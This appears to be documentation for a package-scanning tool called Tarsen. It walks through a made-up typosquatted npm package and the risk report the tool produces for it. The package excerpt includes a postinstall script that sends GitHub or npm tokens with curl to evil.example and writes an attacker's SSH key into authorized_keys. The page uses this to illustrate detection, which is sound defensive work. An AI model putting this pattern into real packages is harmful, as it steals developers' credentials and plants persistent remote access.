# A suspicious package, as Tarsen sees it

This is a synthetic example showing what a hostile `npx`-style package can look
like and how Tarsen's report reads. The package below is **not real** — it is a
composite of common supply-chain patterns. It is here to make the report shape
concrete.

## The package (hypothetical)

`create-appp` — note the doubled `p`, one edit from `create-app`.

```jsonc
// package.json (excerpt)
{
  "name": "create-appp",
  "version": "0.0.1",
  "description": "",
  "scripts": {
    "postinstall": "node ./setup.js"
  }
}
```

```js
// setup.js (excerpt)
const { execSync } = require("child_process");
const fs = require("fs");
const home = require("os").homedir();
const token = process.env.GITHUB_TOKEN || process.env.NPM_TOKEN;
execSync(`curl https://evil.example/collect -d "${token}"`, { shell: true });
fs.writeFileSync(home + "/.ssh/authorized_keys", attackerKey);
```

## Why each line matters

| Pattern in the package | Tarsen signal |
| --- | --- |
| `name: "create-appp"` | `typosquatting` (one edit from a common name) |
| empty/missing `description` | `metadata_risk` (low) |
| `postinstall` script | `lifecycle_script` (high) — code runs on install |
| `execSync(` + `child_process` | `dangerous_execution` (high) |
| `{ shell: true }` | `shell_command` (high) |
| `process.env.GITHUB_TOKEN` | `environment_access` (high) — sensitive env |
| `fs.writeFileSync` | `filesystem_write` (medium) |
| `os.homedir()` | `filesystem_read` (low) |
| `curl https://...` | `network_access` (medium) |

## What the report looks like

```jsonc
{
  "schemaVersion": "1.0",
  "package": "create-appp",
  "version": "0.0.1",
  "risk": "high",
  "score": 100,
  "recommendation": "do_not_run_without_user_confirmation",
  "signals": [
    { "type": "lifecycle_script", "severity": "high", "message": "postinstall script detected", "file": "package.json" },
    { "type": "metadata_risk", "severity": "low", "message": "description is missing" },
    { "type": "typosquatting", "severity": "high", "message": "package name is one edit away from \"create-react-app\"" },
    { "type": "dangerous_execution", "severity": "high", "message": "child process execution detected", "file": "setup.js" },
    { "type": "shell_command", "severity": "high", "message": "shell command construction detected", "file": "setup.js" },
    { "type": "environment_access", "severity": "high", "message": "potentially sensitive environment access detected", "file": "setup.js" },
    { "type": "filesystem_write", "severity": "medium", "message": "filesystem write or deletion detected", "file": "setup.js" },
    { "type": "network_access", "severity": "medium", "message": "network access detected", "file": "setup.js" }
  ],
  "metadata": {
    "name": "create-appp",
    "version": "0.0.1",
    "maintainers": [],
    "dependencies": 0,
    "scripts": { "postinstall": "node ./setup.js" }
  },
  "stats": { "filesScanned": 2, "bytesScanned": 480, "truncated": false }
}
```

## What an operator should do

`risk: "high"` and `recommendation: "do_not_run_without_user_confirmation"`
mean: **do not run this**. `tarsen run` would still ask you to type `run`, and
in a non-interactive context it refuses outright (exit code `3`).

The point of Tarsen is that this decision happens *before* `npx` ever executes
the `postinstall` script.
